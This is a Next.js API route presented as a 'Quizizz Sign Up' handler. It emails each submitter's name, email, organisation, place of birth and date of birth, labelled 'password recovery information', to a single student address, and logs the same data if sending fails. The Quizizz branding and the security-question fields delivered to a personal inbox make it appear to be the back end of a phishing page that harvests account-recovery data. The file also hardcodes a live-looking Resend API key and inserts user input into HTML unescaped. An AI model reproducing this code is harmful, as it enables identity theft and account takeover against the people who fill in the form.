import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    const signupData = await request.json()

    // Format the email content
    const emailContent = `
      <h2>New Quizizz Sign Up Registration</h2>
      
      <h3>Personal Information:</h3>
      <ul>
        <li><strong>Name:</strong> ${signupData.firstName} ${signupData.lastName}</li>
        <li><strong>Email:</strong> ${signupData.email}</li>
        <li><strong>Organization:</strong> ${signupData.organization || "Not provided"}</li>
      </ul>
      
      <h3>Password Recovery Information:</h3>
      <ul>
        <li><strong>Place of Birth:</strong> ${signupData.placeOfBirth}</li>
        <li><strong>Date of Birth:</strong> ${signupData.dateOfBirth}</li>
      </ul>
      
      <p><strong>Submitted at:</strong> ${new Date().toISOString()}</p>
    `

    // Send email using a service like Resend (you'll need to add your API key)
    const emailResponse = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        Authorization: `Bearer re_d7umzP5m_JuzL5RF9TWYBx42x8Y1gDQRP`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        from: "Quizizz Signup <onboarding@resend.dev>",
        to: ["s2250928@students.ncl-coll.ac.uk"],
        subject: `New Quizizz Sign Up - ${signupData.firstName} ${signupData.lastName}`,
        html: emailContent,
      }),
    })

    if (!emailResponse.ok) {
      const errorData = await emailResponse.text()
      console.error("Resend API error:", errorData)

      // Fallback: Use a different email service or log the data
      console.log("Email content that would be sent to s2250928@students.ncl-coll.ac.uk:")
      console.log(emailContent)

      return NextResponse.json(
        {
          success: false,
          error: "Email service unavailable, but data was logged",
        },
        { status: 500 },
      )
    }

    const result = await emailResponse.json()
    console.log("Email sent successfully:", result)

    return NextResponse.json({
      success: true,
      message: "Email sent successfully",
      emailId: result.id,
    })
  } catch (error) {
    console.error("Error in email API route:", error)

    // Fallback logging if email service fails
    const signupData = await request.json().catch(() => ({}))
    console.log("Fallback - Email content for s2250928@students.ncl-coll.ac.uk:")
    console.log(`
      New Quizizz Sign Up:
      Name: ${signupData.firstName} ${signupData.lastName}
      Email: ${signupData.email}
      Organization: ${signupData.organization || "Not provided"}
      Place of Birth: ${signupData.placeOfBirth}
      Date of Birth: ${signupData.dateOfBirth}
      Submitted at: ${new Date().toISOString()}
    `)

    return NextResponse.json(
      {
        success: false,
        error: "Failed to send email, but data was logged",
      },
      { status: 500 },
    )
  }
}
